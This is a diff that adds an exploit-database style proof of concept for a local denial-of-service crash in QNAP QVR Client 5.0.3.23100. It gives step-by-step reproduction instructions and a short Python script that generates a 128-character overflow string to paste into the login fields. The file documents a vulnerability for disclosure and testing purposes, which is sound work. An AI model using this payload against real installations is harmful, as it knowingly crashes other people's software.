@@ -1,0 +1,24 @@
+# Exploit Title : QNap QVR Client 5.0.3.23100 - Denial of Service (PoC)
+# Discovery by  : Rodrigo Eduardo Rodriguez
+# Discovery Date    : 2018-08-06
+# Vendor Homepage: http://www.qnapsecurity.com/n/en/
+# Software Link : http://download.qnap.com/Surveillance/Utility/QNewMon5.zip
+# Tested Version    : 5.0.3.23100
+# Vulnerability Type    : Denial of Service (DoS) Local
+# Tested on OS  : Windows 10 Pro x64 es
+
+# Steps to Produce the Crash: 
+# 1.- Run python code : python generatepaste.py
+# 2.- Open generate.txt and copy content to clipboard
+# 3.- Open QVR Client
+# 4.- Direccion IP/Puerto -> 0.0.0.0 / 80
+# 5.- Paste ClipBoard on "Nombre de Usuario" and "contraseña"
+# 6.- Aceptar
+# 7.- Crashed
+
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+buffer = "\x41" * 128
+f = open ("generate.txt", "w")
+f.write(buffer)
+f.close()
